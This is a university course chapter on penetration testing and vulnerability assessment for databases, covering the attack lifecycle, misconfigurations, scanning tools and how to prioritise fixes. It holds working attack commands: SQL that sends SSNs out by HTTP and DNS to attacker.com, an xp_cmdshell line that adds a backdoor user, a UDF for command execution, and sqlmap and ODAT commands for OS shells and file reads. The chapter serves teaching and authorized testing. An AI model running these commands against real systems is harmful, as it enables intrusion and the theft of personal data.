---
title: "Vulnerability Assessment and Penetration Testing for Databases"
week: 9
chapter: 9
course: SCIA-340
---

# Chapter 9: Vulnerability Assessment and Penetration Testing for Databases

## Introduction

Understanding how attackers approach database systems is essential for defenders. Penetration testing — authorized simulated attacks — and vulnerability assessment — systematic identification of weaknesses — are critical tools for validating database security controls before real attackers exploit them. This chapter examines the database attack lifecycle from an attacker's perspective, common vulnerabilities that are repeatedly found in production environments, the tools used for database security testing, and methodologies for conducting and prioritizing remediation from database assessments.

> **Ethical and Legal Notice:** All techniques described in this chapter are presented for educational and authorized security testing purposes only. Conducting these activities against systems without explicit written authorization is a federal crime under the Computer Fraud and Abuse Act (CFAA) and equivalent laws in other jurisdictions. Always obtain proper authorization before performing any security testing.

---

## 9.1 The Database Attack Lifecycle

Attackers targeting database systems typically follow a structured progression. Understanding this lifecycle helps defenders identify where to place controls and detection mechanisms.

```
Reconnaissance → Initial Access → Privilege Escalation → Data Discovery → Exfiltration → Cover Tracks
```

**Reconnaissance:** The attacker identifies that a database exists, determines its type and version, and gathers intelligence about the target environment. This may involve passive research (Shodan, Google dorks, public breaches) or active scanning.

**Initial Access:** The attacker gains an initial foothold — exploiting a SQL injection vulnerability in a web application, using stolen credentials, exploiting an unpatched vulnerability, or compromising an application server that has database access.

**Privilege Escalation:** If the initial access is through a low-privilege account (e.g., an application service account), the attacker attempts to escalate to a DBA role or OS-level access.

**Data Discovery:** The attacker maps the database schema, identifies tables containing sensitive data, and determines the most valuable data to exfiltrate.

**Exfiltration:** Data is moved out of the database and the network. The attacker may use slow, careful extraction to avoid triggering volume-based alerts.

**Covering Tracks:** Audit logs are modified or deleted, connections are closed, and temporary objects (stored procedures, linked servers) created during the attack are removed.

---

## 9.2 Database Reconnaissance

### 9.2.1 Banner Grabbing and Version Fingerprinting

The first step for an attacker is identifying what database is running and, crucially, what version. Version information directly maps to known CVEs:

```bash
# nmap version scan against common database ports
nmap -sV -p 1433,1521,3306,5432 192.168.1.0/24

# Example output:
# 192.168.1.50  1433/tcp open  ms-sql-s  Microsoft SQL Server 2014 12.00.2000; RTM

# SQL Server-specific scripts
nmap -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password 192.168.1.50

# MySQL fingerprinting
nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-databases 192.168.1.51

# PostgreSQL
nmap -p 5432 --script pgsql-brute 192.168.1.52
```

"Microsoft SQL Server 2014 RTM" tells an attacker immediately that the server is missing years of patches and is vulnerable to dozens of known CVEs. Version disclosure at the network level is the first piece of information an attacker uses to select exploits.

### 9.2.2 Error Message Fingerprinting

Web applications that display raw database error messages reveal the underlying database platform and sometimes schema information. A poorly handled SQL error might display:

```
ORA-00942: table or view does not exist
```
or
```
Microsoft OLE DB Provider for SQL Server error '80040e14'
Incorrect syntax near 'test'
```

These messages confirm the database type and version, confirm that SQL injection is possible, and may reveal table or column names. Proper error handling (generic error messages to users, detailed errors logged internally) eliminates this information leakage.

---

## 9.3 Common Database Vulnerabilities

### 9.3.1 Unpatched CVEs

Database patching consistently lags behind OS patching in most organizations. Reasons include:
- Concerns about patch compatibility with custom applications
- Perceived risk of patch-related downtime on production systems
- Complex testing requirements before applying patches
- Lack of awareness that database patches address security issues

The result: production databases running with known, exploitable vulnerabilities for months or years. Oracle Critical Patch Updates (CPUs) are released quarterly and routinely address dozens of vulnerabilities. SQL Server Cumulative Updates include security fixes. Running a version that is multiple patch cycles behind is a significant organizational risk.

### 9.3.2 Default Credentials

Despite decades of warnings, default credentials remain one of the most commonly found vulnerabilities in database assessments.

| Database | Default Account | Default Password |
|---|---|---|
| SQL Server | `sa` | (blank in some versions) |
| Oracle | `system` | `manager` |
| Oracle | `sys` | `change_on_install` |
| MySQL | `root` | (blank in older versions) |
| PostgreSQL | `postgres` | `postgres` |
| MongoDB | (none) | (no auth in older versions) |

Automated scanners and attackers attempt these credentials immediately after discovering a database port. Eliminating default credentials is one of the highest-impact, lowest-effort security improvements available.

### 9.3.3 Excessive Privileges and PUBLIC Role Abuse

The `PUBLIC` role (or `PUBLIC` user in Oracle) is the implicit role granted to every user. Any privilege granted to PUBLIC is available to all database users, including the application service account and any attacker who gains any authenticated access.

In Oracle, many built-in packages (UTL_FILE, UTL_HTTP, UTL_TCP, DBMS_JAVA) are granted to PUBLIC by default and can be abused for:
- Reading and writing OS files (UTL_FILE)
- Making outbound HTTP requests (UTL_HTTP) — useful for data exfiltration
- Executing OS commands (DBMS_JAVA, if Java is enabled)

```sql
-- Check what's granted to PUBLIC in Oracle
SELECT grantee, owner, table_name, privilege
FROM dba_tab_privs
WHERE grantee = 'PUBLIC'
ORDER BY owner, table_name;
```

### 9.3.4 Dangerous Built-In Functions

**SQL Server — xp_cmdshell:**
`xp_cmdshell` is an extended stored procedure that executes operating system commands and returns output as database rows. Disabled by default since SQL Server 2005, it is frequently re-enabled by developers or administrators for convenience.

```sql
-- Check if xp_cmdshell is enabled
SELECT name, value_in_use
FROM sys.configurations
WHERE name = 'xp_cmdshell';

-- If enabled, an attacker can run OS commands:
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user attacker Password123! /add';
```

**MySQL — LOAD DATA INFILE:**
Allows reading arbitrary files from the server filesystem (or client filesystem with `LOAD DATA LOCAL INFILE`):

```sql
-- Read /etc/passwd if FILE privilege is granted
LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_table;
```

**Oracle — UTL_HTTP/UTL_FILE:**
```sql
-- Exfiltrate data via HTTP request (if UTL_HTTP not revoked from PUBLIC)
DECLARE
  req UTL_HTTP.REQ;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/?data=' || (SELECT ssn FROM employees WHERE rownum=1));
END;
/
```

### 9.3.5 User-Defined Function (UDF) Abuse

MySQL and PostgreSQL allow the creation of user-defined functions compiled as shared libraries. An attacker with sufficient privileges can upload a malicious shared library and create a UDF that executes OS commands:

```sql
-- MySQL UDF for command execution (concept — requires FILE and CREATE FUNCTION privs)
CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id > /tmp/id.txt');
```

This effectively transforms a database compromise into full OS compromise.

---

## 9.4 Privilege Escalation Techniques

### 9.4.1 SQL Server EXECUTE AS Impersonation

SQL Server's `EXECUTE AS` feature allows executing code in the context of another user. If an attacker gains access to a user who has `IMPERSONATE` permission on a higher-privilege user, they can escalate:

```sql
-- Check who can be impersonated
SELECT b.name AS 'who_can_impersonate', a.name AS 'being_impersonated'
FROM sys.server_permissions p
JOIN sys.server_principals a ON p.major_id = a.principal_id
JOIN sys.server_principals b ON p.grantee_principal_id = b.principal_id
WHERE p.type = 'IM';

-- Escalate to sa if impersonation is granted
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; -- returns 'sa'
```

### 9.4.2 Trusted Stored Procedures

In SQL Server, a stored procedure owned by a high-privilege user and marked as `TRUSTWORTHY` can allow privilege escalation if the database has `TRUSTWORTHY` enabled. This is a known misconfiguration that security assessments routinely check.

### 9.4.3 Oracle Invoker Rights vs. Definer Rights

Oracle stored procedures can run with either `AUTHID DEFINER` (the procedure runs with the owner's privileges) or `AUTHID CURRENT_USER` (the procedure runs with the caller's privileges). A definer-rights procedure owned by a DBA that accepts user-controlled input can be exploited to execute DBA-level SQL.

---

## 9.5 Data Exfiltration Techniques

### 9.5.1 DNS-Based Exfiltration

On SQL Server with `xp_cmdshell` enabled, data can be exfiltrated via DNS lookups that are difficult to distinguish from normal network traffic:

```sql
-- Each DNS lookup for a subdomain encodes one row of stolen data
EXEC xp_cmdshell 'nslookup ' + (SELECT TOP 1 CAST(ssn AS VARCHAR) FROM employees WHERE id=1) + '.attacker.com';
```

The attacker's server logs the DNS queries and reconstructs the exfiltrated data.

### 9.5.2 Out-of-Band SQL Injection

Blind SQL injection — where the application doesn't return query results directly — can use out-of-band channels to exfiltrate data when DNS or HTTP requests can be triggered from the database server.

### 9.5.3 Bulk Export

If an attacker has DBA-level access, bulk export utilities move data quickly:
```bash
# SQL Server bcp utility
bcp "SELECT * FROM SensitiveDB.dbo.customers" queryout customers.csv -S server -U sa -P password -c

# Oracle SPOOL
SPOOL /tmp/data.csv
SELECT customer_id || ',' || ssn FROM customers;
SPOOL OFF

# MySQL SELECT INTO OUTFILE
SELECT * INTO OUTFILE '/tmp/dump.csv' FROM customers;
```

---

## 9.6 Vulnerability Scanning Tools

### 9.6.1 Nessus

Tenable Nessus includes an extensive database plugin library. Key plugins check for:
- Default credentials
- Version-specific CVEs
- Blank passwords
- Anonymous access
- Configuration deviations from CIS Benchmarks

Nessus can connect to the database with provided credentials for authenticated scanning, which produces significantly more detailed results than unauthenticated scanning.

### 9.6.2 CIS Benchmarks and CIS-CAT

The Center for Internet Security publishes **CIS Benchmarks** for all major database platforms. These benchmarks define hundreds of specific configuration checks. **CIS-CAT Pro** is an automated assessment tool that evaluates a database against its benchmark and produces a scored report.

Common CIS checks for databases include:
- Password policy settings
- Audit configuration
- Network listener configuration
- Default account status
- Privilege assignments

### 9.6.3 SQLMap

SQLMap is the leading open-source SQL injection testing tool. Beyond basic injection detection, its advanced features are used in authorized penetration tests:

```bash
# Basic scan
sqlmap -u "https://example.com/app?id=1"

# Use a tamper script to bypass WAF filtering
sqlmap -u "https://example.com/app?id=1" --tamper=space2comment

# Extract database list
sqlmap -u "https://example.com/app?id=1" --dbs

# Dump a specific table
sqlmap -u "https://example.com/app?id=1" -D webapp -T users --dump

# Attempt OS shell (requires high privileges)
sqlmap -u "https://example.com/app?id=1" --os-shell

# File read
sqlmap -u "https://example.com/app?id=1" --file-read=/etc/passwd
```

Tamper scripts modify payloads to evade WAF signature detection. Examples include `space2comment` (replacing spaces with `/**/`), `between` (replacing `>` with `NOT BETWEEN`), and `hex2char` (encoding strings as hex).

### 9.6.4 Oracle ODAT (Oracle Database Attacking Tool)

ODAT is a specialized post-exploitation toolkit for Oracle databases, written in Python:

```bash
# Enumerate modules available for the current account
python odat.py all -s 192.168.1.100 -d orcl -U scott -P tiger

# Upload a file using UTL_FILE
python odat.py utlfile -s 192.168.1.100 -d orcl -U scott -P tiger --putFile /tmp test.txt ./test.txt

# Execute OS commands via Java stored procedures
python odat.py java -s 192.168.1.100 -d orcl -U scott -P tiger --exec id
```

### 9.6.5 Specialized Tools

- **mssqlclient.py** (Impacket) — Full-featured SQL Server client with NTLM authentication support, used in Windows domain penetration tests
- **PowerUpSQL** — PowerShell toolkit for SQL Server security assessment and post-exploitation in Active Directory environments
- **SQLNinja** — SQL Server injection exploitation tool focused on OS access

---

## 9.7 Penetration Testing Methodology for Databases

A database penetration test follows a structured methodology:

**Phase 1 — Planning and Scoping**
- Define scope: which database servers, which methods are authorized
- Rules of engagement: are destructive tests (DROP TABLE) allowed? What is the backup and recovery plan?
- Legal authorization: signed authorization documentation
- Establish communication channels for findings during the test

**Phase 2 — Reconnaissance**
- Passive: Shodan, DNS records, job postings (which database is used?), certificate transparency
- Active: port scanning, version detection, service enumeration

**Phase 3 — Vulnerability Identification**
- Automated scanning (Nessus, OpenVAS, CIS-CAT)
- Manual testing: default credential attempts, common misconfigurations
- SQL injection testing of connected applications

**Phase 4 — Exploitation**
- Attempt to gain authenticated access through identified vulnerabilities
- Escalate privileges if initial access is limited
- Document each successful exploitation step

**Phase 5 — Post-Exploitation**
- Enumerate accessible data (schema mapping, sensitive table identification)
- Demonstrate data exfiltration capability (extract small sample, not bulk)
- Document reach: what could be accessed with the obtained privileges?

**Phase 6 — Reporting and Remediation**
- Document all findings with evidence (screenshots, commands, output)
- Risk rate each finding (Critical/High/Medium/Low)
- Provide specific remediation guidance for each finding
- Retest after remediation to verify fixes

---

## 9.8 Remediation Prioritization

Not all vulnerabilities are equally urgent. Use a risk-based approach:

| Priority | Finding | Rationale |
|---|---|---|
| Critical | Default credentials (`sa`, `system/manager`) | Immediate, trivial exploitation |
| Critical | xp_cmdshell enabled | Direct OS access from database |
| Critical | Database port exposed to internet | Eliminates all other controls |
| High | Unpatched CVEs with public exploits | Known attack paths |
| High | Excessive PUBLIC role privileges | Broad attack surface |
| Medium | Audit logging disabled | No detection capability |
| Medium | TLS not enforced for connections | Credential interception risk |
| Low | Default port in use | Minor reconnaissance friction lost |

---

## Key Terms

| Term | Definition |
|---|---|
| **Penetration Testing** | Authorized simulated attack to identify and validate security vulnerabilities |
| **Vulnerability Assessment** | Systematic identification and classification of vulnerabilities without exploitation |
| **Banner Grabbing** | Retrieving version and type information from a network service |
| **xp_cmdshell** | SQL Server extended stored procedure for executing OS commands |
| **UTL_HTTP** | Oracle package enabling HTTP requests from PL/SQL code |
| **LOAD DATA INFILE** | MySQL statement for loading data from a filesystem file into a table |
| **EXECUTE AS** | SQL Server statement for impersonating another database principal |
| **AUTHID DEFINER** | Oracle stored program attribute causing execution under owner's privileges |
| **SQLMap** | Open-source automated SQL injection detection and exploitation tool |
| **ODAT** | Oracle Database Attacking Tool — post-exploitation toolkit for Oracle |
| **CIS Benchmark** | Configuration security standard published by Center for Internet Security |
| **UDF (User-Defined Function)** | Custom function that can be implemented as a compiled shared library |
| **Out-of-Band Exfiltration** | Data theft using a secondary channel (DNS, HTTP) rather than direct query response |
| **bcp (Bulk Copy Program)** | SQL Server utility for bulk data import/export |
| **Tamper Script** | SQLMap script that modifies injection payloads to bypass WAF signatures |
| **CVE** | Common Vulnerabilities and Exposures — standardized vulnerability identifier |
| **PowerUpSQL** | PowerShell toolkit for SQL Server security assessment |
| **DNS Exfiltration** | Encoding stolen data in DNS query hostnames to bypass data loss prevention |
| **Trusted Database** | SQL Server configuration allowing cross-database privilege escalation |
| **Rules of Engagement** | Written agreement defining scope and limits of authorized security testing |

---

## Review Questions

1. **Conceptual:** Describe the five phases of a database attack lifecycle from reconnaissance through covering tracks. At which phase would you ideally want your detective controls (auditing, DAM) to trigger an alert, and why?

2. **Applied:** Using nmap, write commands to: (a) discover all hosts on the 10.10.5.0/24 network with SQL Server running, (b) determine the SQL Server version, and (c) check for empty passwords. Explain what information each command returns.

3. **Scenario:** During a penetration test, you discover that SQL Server's `xp_cmdshell` is enabled and the `sa` account has a weak password. Describe the full attack chain an attacker would use from initial connection to obtaining OS-level access. What remediations would you recommend for each step?

4. **Analysis:** An Oracle database assessment reveals that `EXECUTE` on `UTL_HTTP` is granted to `PUBLIC`. Why is this a serious finding? Write a proof-of-concept PL/SQL block that demonstrates the risk (data exfiltration via HTTP). What is the remediation?

5. **Applied:** Explain how SQLMap's tamper scripts work and why they are necessary. Give two examples of tamper scripts and describe the WAF evasion technique each one implements.

6. **Conceptual:** Compare and contrast a vulnerability assessment with a penetration test. When would an organization choose one over the other? What is the difference in deliverables?

7. **Scenario:** A web application uses parameterized queries everywhere *except* in its search feature, which builds a SQL query by concatenating a user-supplied search term. Write an example SQL injection payload that would: (a) confirm injection exists, (b) enumerate the database version, and (c) list all table names. Then explain how to fix the underlying vulnerability.

8. **Applied:** What CIS Benchmark checks would you perform to assess a PostgreSQL database's security posture? List at least five specific checks and the security issue each one addresses.

9. **Conceptual:** Explain the SQL Server `TRUSTWORTHY` database property and how it can be abused for privilege escalation. What is the recommended configuration and why?

10. **Scenario:** After completing a database penetration test, you have a list of 23 findings ranging from default credentials to missing patches to overly broad PUBLIC privileges. Write a brief remediation prioritization plan: which findings should be addressed in the first 24 hours, first week, and first month? Justify your prioritization.

---

## Further Reading

- Litchfield, D., Anley, C., Heasman, J., & Grindlay, B. *The Database Hacker's Handbook: Defending Database Servers*. Wiley, 2005.
- Center for Internet Security. *CIS Benchmarks for Database Servers* (Oracle, SQL Server, MySQL, PostgreSQL). https://www.cisecurity.org/cis-benchmarks/
- Bernardo Damele A. G. & Miroslav Stampar. *SQLMap — Automatic SQL Injection and Database Takeover Tool*. https://sqlmap.org/
- Tenable. *Nessus Database Compliance Checks*. https://www.tenable.com/products/nessus
- OWASP. *Testing for SQL Injection (OTG-INPVAL-005)*. OWASP Testing Guide v4. https://owasp.org/www-project-web-security-testing-guide/
